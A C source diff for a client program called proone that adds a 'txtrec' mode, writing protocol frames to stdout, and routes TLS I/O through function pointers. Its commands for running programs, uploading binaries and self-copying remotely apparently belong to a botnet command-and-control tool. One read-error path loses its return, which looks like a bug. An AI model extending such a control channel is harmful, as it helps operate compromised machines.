@@ -60,7 +60,8 @@
 "                       help and exit if no command is specified\n"\
 "  -V, --version        print version and exit\n"\
 "  -x                   do not use stdio for user interaction(\"script mode\")\n"\
-"  -v, --verbose        increase verbose level. Can be specified more than once\n"\
+"  -v, --verbose        increase verbose level. Can be used more than once\n"\
+"  -m <MODE>            mode selection. 'tls'(default) or 'txtrec'\n"\
 "  --tls-ca <FILE>      path to tls CA certificate\n"\
 "  --tls-cert <FILE>    path to tls client certificate\n"\
 "  --tls-key <FILE>     path to tls private key\n"\
@@ -130,11 +131,23 @@
 "The program will write to stdout if OUTFILE is \"-\"(default).\n"\
 "If --arch option is not used, binary recombination will not take place and the\n"\
 "running executable will be copied(i.e., \"self copy\").\n"\
+"OS codes are reserved in the protocol but not exposed on programs.\n"\
 "Run proone-list-arch for possible values for --arch option.\n"\
 "\n"
 
+enum prog_mode {
+	PM_NONE,
+
+	PM_TLS,
+	PM_TXTREC,
+
+	NB_PM
+};
+typedef enum prog_mode prog_mode_t;
+
 enum sub_command {
 	SC_NONE,
+
 	SC_HOSTINFO,
 	SC_HOVER,
 	SC_RUNCMD,
@@ -148,6 +161,7 @@ typedef enum sub_command sub_command_t;
 
 enum bin_type {
 	BT_NONE,
+
 	BT_NYBIN,
 	BT_EXEC,
 
@@ -162,6 +176,7 @@ struct {
 	char tls_key_pw[256]; // scrub after use
 	char *remote_host;
 	char *remote_port;
+	prog_mode_t mode;
 	sub_command_t cmd;
 	int prne_vl;
 	bool help; // -h or --help used
@@ -202,6 +217,12 @@ struct {
 		mbedtls_net_context ctx;
 		prne_iobuf_t ib;
 	} net;
+	struct {
+		bool (*do_connect)(void);
+		void (*do_disconnect)(void);
+		ssize_t (*do_read)(void *buf, size_t l);
+		ssize_t (*do_write)(const void *buf, size_t l);
+	} io;
 	struct {
 		yaml_emitter_t *emitter;
 		int fd;
@@ -250,6 +271,8 @@ static void print_help (const char *prog, const sub_command_t sc, FILE *out_f) {
 }
 
 static void init_prog_g (void) {
+	int f_ret;
+
 	prne_memzero(&prog_g, sizeof(prog_g)); // so main() is recallable
 
 	mbedtls_ssl_config_init(&prog_g.ssl.conf);
@@ -267,6 +290,17 @@ static void init_prog_g (void) {
 			prne_op_max(PRNE_HTBT_PROTO_MIN_BUF, prne_getpagesize())))
 	{
 		perror("prne_alloc_iobuf()");
+		abort();
+	}
+
+	f_ret = mbedtls_ctr_drbg_seed(
+		&prog_g.ssl.rnd,
+		mbedtls_entropy_func,
+		&prog_g.ssl.ent,
+		NULL,
+		0);
+	if (f_ret != 0) {
+		prne_mbedtls_perror(f_ret, "mbedtls_ctr_drbg_seed()");
 		abort();
 	}
 
@@ -329,6 +363,7 @@ static void init_prog_conf (void) {
 	prne_memzero(&prog_conf, sizeof(prog_conf)); // so main() is recallable
 	prog_conf.remote_port = prne_dup_str(STRINGIFY_X(PRNE_HTBT_PROTO_PORT));
 	prog_conf.prne_vl = PRNE_VL_INFO;
+	prog_conf.mode = PM_TLS;
 }
 
 static void free_hover_conf (void) {
@@ -418,6 +453,9 @@ static void load_optarg (char **out) {
 }
 
 static bool assert_host_arg (void) {
+	if (prog_conf.mode == PM_TXTREC) {
+		return true;
+	}
 	if (prog_conf.remote_host == NULL) {
 		fprintf(stderr, "Use -t or --host option to specify host.\n");
 		return false;
@@ -639,6 +677,12 @@ static int parse_args_upbin (const int argc, char *const *args) {
 		fprintf(stderr, "Use --nybin or --exec to specify binary type.\n");
 		return 2;
 	}
+	if (prog_conf.cmd_param.run.bin_type == BT_NYBIN &&
+		prog_conf.mode == PM_TXTREC)
+	{
+		fprintf(stderr, "--nybin is not supported in txtrec mode.\n");
+		return 2;
+	}
 
 	if (argc <= optind) {
 		fprintf(stderr, "FILE not specified.\n");
@@ -736,7 +780,7 @@ static int parse_args (const int argc, char *const *args) {
 	const struct option *cur_lo;
 
 	while (true) {
-		fr = getopt_long(argc, args, "+hVvxt:p:", lopts, &li);
+		fr = getopt_long(argc, args, "+hVvxt:p:m:", lopts, &li);
 
 		switch (fr) {
 		case 0:
@@ -794,6 +838,18 @@ static int parse_args (const int argc, char *const *args) {
 			break;
 		case 'p':
 			load_optarg(&prog_conf.remote_port);
+			break;
+		case 'm':
+			if (strcmp(optarg, "tls") == 0) {
+				prog_conf.mode = PM_TLS;
+			}
+			else if (strcmp(optarg, "txtrec") == 0) {
+				prog_conf.mode = PM_TXTREC;
+			}
+			else {
+				fprintf(stderr, "%s: invalid mode\n", optarg);
+				return 2;
+			}
 			break;
 		default:
 			goto END_LOOP;
@@ -911,103 +967,6 @@ END: // CATCH
 		tcsetattr(STDIN_FILENO, TCSAFLUSH, &t);
 	}
 	return ret;
-}
-
-static int init_tls (void) {
-	int f_ret;
-	static const char *ALPN_ARR[] = {
-		PRNE_HTBT_TLS_ALP,
-		NULL
-	};
-
-	f_ret = mbedtls_ctr_drbg_seed(
-		&prog_g.ssl.rnd,
-		mbedtls_entropy_func,
-		&prog_g.ssl.ent,
-		NULL,
-		0);
-	if (f_ret != 0) {
-		prne_mbedtls_perror(f_ret, "mbedtls_ctr_drbg_seed()");
-		abort();
-	}
-
-	f_ret = mbedtls_ssl_config_defaults(
-		&prog_g.ssl.conf,
-		MBEDTLS_SSL_IS_CLIENT,
-		MBEDTLS_SSL_TRANSPORT_STREAM,
-		MBEDTLS_SSL_PRESET_DEFAULT);
-	if (f_ret != 0) {
-		prne_mbedtls_perror(f_ret, "mbedtls_ssl_config_defaults()");
-		abort();
-	}
-
-	f_ret = mbedtls_ssl_conf_alpn_protocols(&prog_g.ssl.conf, ALPN_ARR);
-	if (f_ret != 0) {
-		prne_mbedtls_perror(f_ret, "mbedtls_ssl_conf_alpn_protocols()");
-		abort();
-	}
-
-	mbedtls_ssl_conf_rng(
-		&prog_g.ssl.conf,
-		mbedtls_ctr_drbg_random,
-		&prog_g.ssl.rnd);
-
-	if (prog_conf.tls_ca != NULL) {
-		f_ret = mbedtls_x509_crt_parse_file(&prog_g.ssl.ca, prog_conf.tls_ca);
-		if (f_ret != 0) {
-			prne_mbedtls_perror(f_ret, prog_conf.tls_ca);
-			return 1;
-		}
-		mbedtls_ssl_conf_ca_chain(&prog_g.ssl.conf, &prog_g.ssl.ca, NULL);
-		mbedtls_ssl_conf_authmode(
-			&prog_g.ssl.conf,
-			MBEDTLS_SSL_VERIFY_REQUIRED);
-	}
-	else {
-		mbedtls_ssl_conf_authmode(
-			&prog_g.ssl.conf,
-			MBEDTLS_SSL_VERIFY_OPTIONAL);
-	}
-	if (prog_conf.tls_cert != NULL) {
-		f_ret = mbedtls_x509_crt_parse_file(&prog_g.ssl.crt, prog_conf.tls_cert);
-		if (f_ret != 0) {
-			prne_mbedtls_perror(f_ret, prog_conf.tls_cert);
-			return 1;
-		}
-	}
-	if (prog_conf.tls_key != NULL) {
-		do {
-			f_ret = mbedtls_pk_parse_keyfile(
-				&prog_g.ssl.pk,
-				prog_conf.tls_key,
-				prog_conf.tls_key_pw);
-			switch (f_ret) {
-			case MBEDTLS_ERR_PK_PASSWORD_REQUIRED:
-			case MBEDTLS_ERR_PK_PASSWORD_MISMATCH:
-				prne_mbedtls_perror(f_ret, "mbedtls_pk_parse_keyfile()");
-				if (!interact_tls_key_pw()) {
-					return 1;
-				}
-				break;
-			case 0: break;
-			default:
-				prne_mbedtls_perror(f_ret, prog_conf.tls_key);
-				return 1;
-			}
-		} while (f_ret != 0);
-	}
-	prne_memzero(prog_conf.tls_key_pw, sizeof(prog_conf.tls_key_pw));
-
-	f_ret = mbedtls_ssl_conf_own_cert(
-		&prog_g.ssl.conf,
-		&prog_g.ssl.crt,
-		&prog_g.ssl.pk);
-	if (f_ret != 0) {
-		prne_mbedtls_perror(f_ret, "mbedtls_ssl_conf_own_cert()");
-		return 1;
-	}
-
-	return 0;
 }
 
 static void pstatus (const prne_htbt_status_t *st, const char *s) {
@@ -1218,11 +1177,15 @@ static void end_yaml (void) {
 	}
 }
 
-static bool do_connect (void) {
+static ssize_t do_read_null (void *buf, size_t l) {
+	return 0;
+}
+
+static bool do_connect_tls (void) {
 	int f_ret;
 
 	if (prog_conf.prne_vl >= PRNE_VL_DBG0) {
-		fprintf(stderr, "do_connect()\n");
+		fprintf(stderr, "do_connect_tls()\n");
 	}
 
 	f_ret = mbedtls_net_connect(
@@ -1264,15 +1227,158 @@ static bool do_connect (void) {
 	return true;
 }
 
-static void do_disconnect (void) {
+static void do_disconnect_tls (void) {
 	if (prog_conf.prne_vl >= PRNE_VL_DBG0) {
-		fprintf(stderr, "do_disconnect()\n");
+		fprintf(stderr, "do_disconnect_tls()\n");
 	}
 	mbedtls_ssl_close_notify(&prog_g.ssl.ctx);
 	mbedtls_ssl_free(&prog_g.ssl.ctx);
 
 	mbedtls_net_free(&prog_g.net.ctx);
 	prne_iobuf_reset(&prog_g.net.ib);
+}
+
+static ssize_t do_read_tls (void *buf, size_t l) {
+	return mbedtls_ssl_read(&prog_g.ssl.ctx, (unsigned char *)buf, l);
+}
+
+static ssize_t do_write_tls (const void *buf, size_t l) {
+	return mbedtls_ssl_write(&prog_g.ssl.ctx, (const unsigned char *)buf, l);
+}
+
+static bool do_connect_stdio (void) {
+	if (prog_conf.prne_vl >= PRNE_VL_DBG0) {
+		fprintf(stderr, "do_connect_stdio()\n");
+	}
+	if (isatty(STDOUT_FILENO)) {
+		fprintf(stderr, "Cannot write binary data to terminal.\n");
+		return false;
+	}
+	return true;
+}
+
+static void do_disconnect_stdio (void) {
+	if (prog_conf.prne_vl >= PRNE_VL_DBG0) {
+		fprintf(stderr, "do_disconnect_stdio()\n");
+	}
+}
+
+#if 0
+static ssize_t do_read_stdio (void *buf, size_t l) {
+	return read(STDIN_FILENO, buf, l);
+}
+#endif
+
+static ssize_t do_write_stdio (const void *buf, size_t l) {
+	return write(STDOUT_FILENO, buf, l);
+}
+
+static int init_tls_io (void) {
+	int f_ret;
+	static const char *ALPN_ARR[] = {
+		PRNE_HTBT_TLS_ALP,
+		NULL
+	};
+
+	f_ret = mbedtls_ssl_config_defaults(
+		&prog_g.ssl.conf,
+		MBEDTLS_SSL_IS_CLIENT,
+		MBEDTLS_SSL_TRANSPORT_STREAM,
+		MBEDTLS_SSL_PRESET_DEFAULT);
+	if (f_ret != 0) {
+		prne_mbedtls_perror(f_ret, "mbedtls_ssl_config_defaults()");
+		abort();
+	}
+
+	f_ret = mbedtls_ssl_conf_alpn_protocols(&prog_g.ssl.conf, ALPN_ARR);
+	if (f_ret != 0) {
+		prne_mbedtls_perror(f_ret, "mbedtls_ssl_conf_alpn_protocols()");
+		abort();
+	}
+
+	mbedtls_ssl_conf_rng(
+		&prog_g.ssl.conf,
+		mbedtls_ctr_drbg_random,
+		&prog_g.ssl.rnd);
+
+	if (prog_conf.tls_ca != NULL) {
+		f_ret = mbedtls_x509_crt_parse_file(&prog_g.ssl.ca, prog_conf.tls_ca);
+		if (f_ret != 0) {
+			prne_mbedtls_perror(f_ret, prog_conf.tls_ca);
+			return 1;
+		}
+		mbedtls_ssl_conf_ca_chain(&prog_g.ssl.conf, &prog_g.ssl.ca, NULL);
+		mbedtls_ssl_conf_authmode(
+			&prog_g.ssl.conf,
+			MBEDTLS_SSL_VERIFY_REQUIRED);
+	}
+	else {
+		mbedtls_ssl_conf_authmode(
+			&prog_g.ssl.conf,
+			MBEDTLS_SSL_VERIFY_OPTIONAL);
+	}
+	if (prog_conf.tls_cert != NULL) {
+		f_ret = mbedtls_x509_crt_parse_file(&prog_g.ssl.crt, prog_conf.tls_cert);
+		if (f_ret != 0) {
+			prne_mbedtls_perror(f_ret, prog_conf.tls_cert);
+			return 1;
+		}
+	}
+	if (prog_conf.tls_key != NULL) {
+		do {
+			f_ret = mbedtls_pk_parse_keyfile(
+				&prog_g.ssl.pk,
+				prog_conf.tls_key,
+				prog_conf.tls_key_pw);
+			switch (f_ret) {
+			case MBEDTLS_ERR_PK_PASSWORD_REQUIRED:
+			case MBEDTLS_ERR_PK_PASSWORD_MISMATCH:
+				prne_mbedtls_perror(f_ret, "mbedtls_pk_parse_keyfile()");
+				if (!interact_tls_key_pw()) {
+					return 1;
+				}
+				break;
+			case 0: break;
+			default:
+				prne_mbedtls_perror(f_ret, prog_conf.tls_key);
+				return 1;
+			}
+		} while (f_ret != 0);
+	}
+	prne_memzero(prog_conf.tls_key_pw, sizeof(prog_conf.tls_key_pw));
+
+	f_ret = mbedtls_ssl_conf_own_cert(
+		&prog_g.ssl.conf,
+		&prog_g.ssl.crt,
+		&prog_g.ssl.pk);
+	if (f_ret != 0) {
+		prne_mbedtls_perror(f_ret, "mbedtls_ssl_conf_own_cert()");
+		return 1;
+	}
+
+	prog_g.io.do_connect = do_connect_tls;
+	prog_g.io.do_disconnect = do_disconnect_tls;
+	prog_g.io.do_read = do_read_tls;
+	prog_g.io.do_write = do_write_tls;
+
+	return 0;
+}
+
+static int init_txtrec_io () {
+	prog_g.io.do_connect = do_connect_stdio;
+	prog_g.io.do_disconnect = do_disconnect_stdio;
+	prog_g.io.do_read = do_read_null;
+	prog_g.io.do_write = do_write_stdio;
+
+	return 0;
+}
+
+static int init_io (void) {
+	switch (prog_conf.mode) {
+	case PM_TLS: return init_tls_io();
+	case PM_TXTREC: return init_txtrec_io();
+	default: abort();
+	}
 }
 
 static uint16_t htbt_msgid_rnd_f (void *ctx) {
@@ -1334,16 +1440,13 @@ static bool send_frame (const void *frame, prne_htbt_ser_ft ser_f) {
 	prne_iobuf_shift(&prog_g.net.ib, actual);
 
 	while (prog_g.net.ib.len > 0) {
-		f_ret = mbedtls_ssl_write(
-			&prog_g.ssl.ctx,
-			prog_g.net.ib.m,
-			prog_g.net.ib.len);
+		f_ret = prog_g.io.do_write(prog_g.net.ib.m, prog_g.net.ib.len);
 		if (f_ret == 0) {
 			raise_proto_err("remote end shutdown read");
 			return false;
 		}
 		if (f_ret < 0) {
-			prne_mbedtls_perror(f_ret, "mbedtls_ssl_write()");
+			prne_mbedtls_perror(f_ret, "prog_g.io.do_write()");
 			return false;
 		}
 		prne_iobuf_shift(&prog_g.net.ib, -f_ret);
@@ -1381,16 +1484,13 @@ static bool recv_frame (void *frame, prne_htbt_dser_ft dser_f) {
 			return false;
 		}
 
-		f_ret = mbedtls_ssl_read(
-			&prog_g.ssl.ctx,
-			prog_g.net.ib.m + prog_g.net.ib.len,
-			actual);
+		f_ret = prog_g.io.do_read(prog_g.net.ib.m + prog_g.net.ib.len, actual);
 		if (f_ret == 0) {
 			raise_proto_err("remote end shutdown write");
 			return false;
 		}
 		if (f_ret < 0) {
-			prne_mbedtls_perror(f_ret, "mbedtls_ssl_read()");
+			prne_mbedtls_perror(f_ret, "prog_g.io.do_read()");
 			return false;
 		}
 		prne_iobuf_shift(&prog_g.net.ib, f_ret);
@@ -1683,6 +1783,9 @@ static bool do_hostinfo (
 	if (!send_mh(&mh)) {
 		goto END;
 	}
+	if (prog_conf.mode == PM_TXTREC) {
+		goto END;
+	}
 	if (!recv_mh(&mh, &msgid)) {
 		goto END;
 	}
@@ -1719,7 +1822,7 @@ static int cmdmain_hostinfo (void) {
 	prne_htbt_init_host_info(&hi);
 	prne_htbt_init_status(&st);
 
-	if (!do_connect()) {
+	if (!prog_g.io.do_connect()) {
 		ret = 1;
 		goto END;
 	}
@@ -1821,8 +1924,7 @@ static bool upload_bin (
 		}
 
 		while (prog_g.cmd_st.run.ib.len > 0) {
-			io_ret = mbedtls_ssl_write(
-				&prog_g.ssl.ctx,
+			io_ret = prog_g.io.do_write(
 				prog_g.cmd_st.run.ib.m,
 				prog_g.cmd_st.run.ib.len);
 			if (io_ret == 0) {
@@ -1830,7 +1932,7 @@ static bool upload_bin (
 				return false;
 			}
 			if (io_ret < 0) {
-				prne_mbedtls_perror((int)io_ret, "mbedtls_ssl_write()");
+				prne_mbedtls_perror((int)io_ret, "prog_g.io.do_write()");
 				return false;
 			}
 			if (prog_conf.prne_vl >= PRNE_VL_DBG0) {
@@ -1948,8 +2050,7 @@ static bool run_sendstd (const uint16_t msgid, int *fd) {
 		goto END;
 	}
 	while (prog_g.cmd_st.run.ib.len > 0) {
-		io_ret = mbedtls_ssl_write(
-			&prog_g.ssl.ctx,
+		io_ret = prog_g.io.do_write(
 			prog_g.cmd_st.run.ib.m,
 			prog_g.cmd_st.run.ib.len);
 		if (io_ret == 0) {
@@ -1958,7 +2059,7 @@ static bool run_sendstd (const uint16_t msgid, int *fd) {
 			goto END;
 		}
 		if (io_ret < 0) {
-			prne_mbedtls_perror((int)io_ret, "mbedtls_ssl_write()");
+			prne_mbedtls_perror((int)io_ret, "prog_g.io.do_write()");
 			goto END;
 		}
 
@@ -1977,8 +2078,7 @@ static bool run_relay_stdout (prne_htbt_stdio_t *f) {
 	prne_iobuf_reset(&prog_g.cmd_st.run.ib);
 	while (f->len > 0 || prog_g.cmd_st.run.ib.len > 0) {
 		if (f->len > 0 && prog_g.cmd_st.run.ib.avail > 0) {
-			io_ret = mbedtls_ssl_read(
-				&prog_g.ssl.ctx,
+			io_ret = prog_g.io.do_read(
 				prog_g.cmd_st.run.ib.m + prog_g.cmd_st.run.ib.len,
 				prne_op_min(f->len, prog_g.cmd_st.run.ib.avail));
 			if (io_ret == 0) {
@@ -1986,8 +2086,7 @@ static bool run_relay_stdout (prne_htbt_stdio_t *f) {
 				return false;
 			}
 			if (io_ret < 0) {
-				prne_mbedtls_perror(io_ret, "mbedtls_ssl_read()");
-				return false;
+				prne_mbedtls_perror(io_ret, "prog_g.io.do_read()");
 			}
 
 			f->len -= io_ret;
@@ -2120,13 +2219,16 @@ static int cmdmain_run (void) {
 	msgid = prne_htbt_gen_msgid(NULL, htbt_msgid_rnd_f);
 
 	do { // fake
-		if (!do_connect()) {
+		if (!prog_g.io.do_connect()) {
 			break;
 		}
 		if (prog_conf.cmd == SC_RUNBIN && !do_open_bin()) {
 			break;
 		}
 		if (!run_setup(msgid)) {
+			break;
+		}
+		if (prog_conf.mode == PM_TXTREC) {
 			break;
 		}
 		if (!prog_conf.cmd_param.run.bm.cmd.detach && !run_relay(msgid)) {
@@ -2398,7 +2500,7 @@ static int cmdmain_upbin (void) {
 
 	msgid = prne_htbt_gen_msgid(NULL, htbt_msgid_rnd_f);
 
-	if (!do_connect()) {
+	if (!prog_g.io.do_connect()) {
 		return 1;
 	}
 	switch (prog_conf.cmd_param.run.bin_type) {
@@ -2407,20 +2509,27 @@ static int cmdmain_upbin (void) {
 			return 1;
 		}
 		break;
-	case BT_EXEC: do_open_bin(); break;
+	case BT_EXEC:
+		if (!do_open_bin()) {
+			return 1;
+		}
+		break;
 	default: abort();
 	}
-	if (!do_ayt()) {
+	if (prog_conf.mode != PM_TXTREC && !do_ayt()) {
 		if (prog_conf.prne_vl >= PRNE_VL_WARN) {
 			fprintf(stderr, "Reconnecting ...\n");
 		}
-		do_disconnect();
-		if (!do_connect()) {
+		prog_g.io.do_disconnect();
+		if (!prog_g.io.do_connect()) {
 			return 1;
 		}
 	}
 	if (!run_setup(msgid)) {
 		return 1;
+	}
+	if (prog_conf.mode == PM_TXTREC) {
+		return 0;
 	}
 	if (!prog_g.cmd_st.run.has_status && !run_recv_status(msgid)) {
 		return 1;
@@ -2446,7 +2555,7 @@ static int cmdmain_hover (void) {
 	mh.is_rsp = false;
 	mh.op = PRNE_HTBT_OP_HOVER;
 
-	if (!do_connect()) {
+	if (!prog_g.io.do_connect()) {
 		ret = 1;
 		goto END;
 	}
@@ -2457,6 +2566,10 @@ static int cmdmain_hover (void) {
 			(prne_htbt_ser_ft)prne_htbt_ser_hover))
 	{
 		ret = 1;
+		goto END;
+	}
+	if (prog_conf.mode == PM_TXTREC) {
+		ret = 0;
 		goto END;
 	}
 	if (!recv_mh(&mh, &msgid)) {
@@ -2540,19 +2653,22 @@ static int cmdmain_rcb (void) {
 	prne_htbt_init_status(&st);
 	prne_htbt_init_stdio(&df);
 
-	if (!rcb_open_outfile()) {
+	if (prog_conf.mode != PM_TXTREC) {
+		if (!rcb_open_outfile()) {
+			ret = 1;
+			goto END;
+		}
+		if (isatty(prog_g.cmd_st.rcb.fd)) {
+			ret = 1;
+			fprintf(stderr, "Cannot write binary data to terminal.\n");
+			goto END;
+		}
+	}
+	if (!prog_g.io.do_connect()) {
 		ret = 1;
 		goto END;
 	}
-	if (isatty(prog_g.cmd_st.rcb.fd)) {
-		ret = 1;
-		fprintf(stderr, "Cannot write binary data to terminal.\n");
-		goto END;
-	}
-	if (!do_connect()) {
-		ret = 1;
-		goto END;
-	}
+
 	mh.id = msgid;
 	mh.op = PRNE_HTBT_OP_RCB;
 	if (!(send_mh(&mh) &&
@@ -2561,6 +2677,11 @@ static int cmdmain_rcb (void) {
 			(prne_htbt_ser_ft)prne_htbt_ser_rcb)))
 	{
 		ret = 1;
+		goto END;
+	}
+
+	if (prog_conf.mode == PM_TXTREC) {
+		ret = 0;
 		goto END;
 	}
 
@@ -2591,10 +2712,7 @@ static int cmdmain_rcb (void) {
 			goto END;
 		}
 		while (df.len > 0) {
-			io_ret = mbedtls_ssl_read(
-				&prog_g.ssl.ctx,
-				prog_g.cmd_st.rcb.ib.m,
-				df.len);
+			io_ret = prog_g.io.do_read(prog_g.cmd_st.rcb.ib.m, df.len);
 			if (io_ret == 0) {
 				ret = 1;
 				raise_proto_err("remote end shutdown write");
@@ -2602,7 +2720,7 @@ static int cmdmain_rcb (void) {
 			}
 			if (io_ret < 0) {
 				ret = 1;
-				prne_mbedtls_perror(io_ret, "mbedtls_ssl_read()");
+				prne_mbedtls_perror(io_ret, "prog_g.io.do_read()");
 				goto END;
 			}
 			prne_iobuf_shift(&prog_g.cmd_st.rcb.ib, io_ret);
@@ -2669,22 +2787,38 @@ int main (const int argc, char *const *args) {
 		goto END;
 	}
 
-	ec = init_tls();
+	ec = init_io();
 	if (ec != 0) {
 		goto END;
 	}
 
-	switch (prog_conf.cmd) {
-	case SC_HOSTINFO: ec = cmdmain_hostinfo(); break;
-	case SC_HOVER: ec = cmdmain_hover(); break;
-	case SC_RUNCMD:
-	case SC_RUNBIN: ec = cmdmain_run(); break;
-	case SC_UPBIN: ec = cmdmain_upbin(); break;
-	case SC_RCB: ec = cmdmain_rcb(); break;
-	default:
+	do {
+		switch (prog_conf.mode) {
+		case PM_TLS:
+			switch (prog_conf.cmd) {
+			case SC_HOSTINFO: ec = cmdmain_hostinfo(); continue;
+			case SC_HOVER: ec = cmdmain_hover(); continue;
+			case SC_RUNCMD:
+			case SC_RUNBIN: ec = cmdmain_run(); continue;
+			case SC_UPBIN: ec = cmdmain_upbin(); continue;
+			case SC_RCB: ec = cmdmain_rcb(); continue;
+			}
+			break;
+		case PM_TXTREC:
+			switch (prog_conf.cmd) {
+			case SC_HOSTINFO: cmdmain_hostinfo(); continue;
+			case SC_HOVER: cmdmain_hover(); continue;
+			case SC_RUNCMD:
+			case SC_RUNBIN: cmdmain_run(); continue;
+			case SC_UPBIN: cmdmain_upbin(); continue;
+			case SC_RCB: cmdmain_rcb(); continue;
+			}
+			break;
+		default: abort();
+		}
 		ec = 1;
 		fprintf(stderr, "COMMAND not implemented.\n");
-	}
+	} while (false);
 
 END:
 	end_yaml();
